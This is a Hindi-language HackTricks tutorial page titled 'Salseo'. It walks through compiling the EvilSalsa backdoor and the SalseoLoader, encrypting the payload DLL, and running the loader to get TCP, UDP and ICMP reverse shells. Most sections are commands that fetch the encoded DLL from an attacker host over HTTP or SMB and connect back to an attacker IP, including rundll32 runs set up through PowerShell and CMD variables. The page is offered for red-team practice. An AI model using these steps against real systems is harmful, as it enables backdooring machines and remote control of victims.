# साल्सियो

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS रेड टीम एक्सपर्ट)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) को **फॉलो करें**.
* **अपनी हैकिंग ट्रिक्स साझा करें PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में.

</details>

## बाइनरीज को कंपाइल करना

github से सोर्स कोड डाउनलोड करें और **EvilSalsa** और **SalseoLoader** को कंपाइल करें। कोड को कंपाइल करने के लिए आपको **Visual Studio** इंस्टॉल करना होगा।

उन प्रोजेक्ट्स को उस विंडोज बॉक्स के आर्किटेक्चर के लिए कंपाइल करें जहां आप उनका उपयोग करने वाले हैं(अगर विंडोज x64 को सपोर्ट करता है तो उस आर्किटेक्चर के लिए कंपाइल करें)।

आप **Visual Studio में बाईं "Build" टैब** में **"Platform Target"** में आर्किटेक्चर का **चयन कर सकते हैं**।

(**अगर आपको ये विकल्प नहीं मिल रहे हैं तो "Project Tab"** में जाएं और फिर **"\<Project Name> Properties"** में)

![](<../.gitbook/assets/image (132).png>)

फिर, दोनों प्रोजेक्ट्स को बिल्ड करें (Build -> Build Solution) (लॉग्स के अंदर एक्जीक्यूटेबल का पथ दिखाई देगा):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## बैकडोर तैयार करना

सबसे पहले, आपको **EvilSalsa.dll** को एन्कोड करना होगा। ऐसा करने के लिए, आप पायथन स्क्रिप्ट **encrypterassembly.py** का उपयोग कर सकते हैं या आप प्रोजेक्ट **EncrypterAssembly** को कंपाइल कर सकते हैं:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### विंडोज
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
## **बैकडोर निष्पादित करें**

### **एक TCP रिवर्स शेल प्राप्त करना (HTTP के माध्यम से एन्कोडेड dll डाउनलोड करना)**

nc को रिवर्स शेल लिसनर के रूप में और एन्कोडेड evilsalsa को सर्व करने के लिए एक HTTP सर्वर के रूप में शुरू करना न भूलें।
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **UDP रिवर्स शेल प्राप्त करना (SMB के माध्यम से एन्कोडेड dll डाउनलोड करना)**

रिवर्स शेल सुनने वाले के रूप में nc शुरू करना न भूलें, और एन्कोडेड evilsalsa सेवा करने के लिए एक SMB सर्वर (impacket-smbserver)।
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **ICMP रिवर्स शेल प्राप्त करना (पीड़ित के अंदर पहले से एन्कोडेड dll)**

**इस बार आपको रिवर्स शेल प्राप्त करने के लिए क्लाइंट में एक विशेष टूल की आवश्यकता है। डाउनलोड करें:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **ICMP रिप्लाई को अक्षम करें:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### क्लाइंट को निष्पादित करें:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### पीड़ित के अंदर, आइए साल्सियो चीज़ को निष्पादित करें:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## SalseoLoader को DLL के रूप में संकलित करना जो मुख्य फ़ंक्शन निर्यात करता है

Visual Studio का उपयोग करके SalseoLoader प्रोजेक्ट खोलें।

### मुख्य फ़ंक्शन से पहले जोड़ें: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### इस प्रोजेक्ट के लिए DllExport स्थापित करें

#### **टूल्स** --> **NuGet पैकेज मैनेजर** --> **समाधान के लिए NuGet पैकेज प्रबंधित करें...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **DllExport पैकेज की खोज करें (Browse टैब का उपयोग करके), और Install दबाएं (और पॉपअप स्वीकार करें)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png>)

आपके प्रोजेक्ट फ़ोल्डर में फ़ाइलें दिखाई देंगी: **DllExport.bat** और **DllExport_Configure.bat**

### **U**ninstall DllExport

**Uninstall** दबाएं (हां, यह अजीब है लेकिन मुझ पर भरोसा करें, यह आवश्यक है)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Visual Studio से बाहर निकलें और DllExport_configure चलाएं**

बस **बाहर निकलें** Visual Studio से

फिर, अपने **SalseoLoader फ़ोल्डर** में जाएं और **DllExport_Configure.bat चलाएं**

**x64** चुनें (अगर आप इसे x64 बॉक्स के अंदर उपयोग करने वाले हैं, वह मेरा मामला था), **System.Runtime.InteropServices** चुनें (अंदर **Namespace for DllExport**) और **Apply** दबाएं

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **प्रोजेक्ट को फिर से Visual Studio के साथ खोलें**

**\[DllExport]** को अब त्रुटि के रूप में चिह्नित नहीं किया जाना चाहिए

![](<../.gitbook/assets/image (8) (1).png>)

### समाधान बनाएं

**आउटपुट प्रकार = क्लास लाइब्रेरी** चुनें (प्रोजेक्ट --> SalseoLoader Properties --> एप्लिकेशन --> आउटपुट प्रकार = क्लास लाइब्रेरी)

![](<../.gitbook/assets/image (10) (1).png>)

**x64** **प्लेटफ़ॉर्म** चुनें (प्रोजेक्ट --> SalseoLoader Properties --> बिल्ड --> प्लेटफ़ॉर्म लक्ष्य = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

समाधान **बनाने** के लिए: बिल्ड --> बिल्ड समाधान (आउटपुट कंसोल के अंदर नए DLL का पथ दिखाई देगा)

### उत्पन्न Dll का परीक्षण करें

Dll को कॉपी करें और उसे जहां परीक्षण करना चाहते हैं वहां पेस्ट करें।

निष्पादित करें:
```
rundll32.exe SalseoLoader.dll,main
```
यदि कोई त्रुटि प्रकट नहीं होती है, तो संभवतः आपके पास एक कार्यात्मक DLL है!!

## DLL का उपयोग करके एक शेल प्राप्त करें

**HTTP** **सर्वर** का उपयोग करना और **nc** **listener** सेट करना न भूलें

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### सीएमडी
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) को **फॉलो करें**.
* **अपनी हैकिंग ट्रिक्स साझा करें, HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके.

</details>
